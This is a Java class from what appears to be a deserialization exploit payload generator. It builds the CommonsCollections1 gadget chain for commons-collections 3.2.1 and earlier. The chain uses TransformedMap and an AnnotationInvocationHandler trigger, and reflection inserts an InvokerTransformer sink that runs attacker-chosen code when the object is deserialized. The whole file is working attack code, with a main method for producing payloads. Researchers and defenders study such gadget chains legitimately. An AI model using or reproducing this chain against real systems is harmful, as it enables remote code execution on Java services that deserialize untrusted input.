package com.ppp.chain.collections3;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.MATTHIASKAISER})
@Sink({Sink.InvokerTransformer3})
public class CommonsCollections1E implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections1E.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object transformers) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        HashMap map = new HashMap();
        map.put("value", "value");

        Map<Object, Object> transMap = TransformedMap.decorate(map, null, transformerChain);
//        Map<Object, Object> transMap = (Map<Object, Object>) Reflections.getFirstCtor("org.apache.commons.collections.map.TransformedMap").newInstance(map, null, transformerChain);

        Object annotationInvocationHandler = KickOff.annotationInvocationHandler(transMap, Target.class);
        // 即 ChainedTransformer 的 Transformer[]
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return annotationInvocationHandler;
    }
}
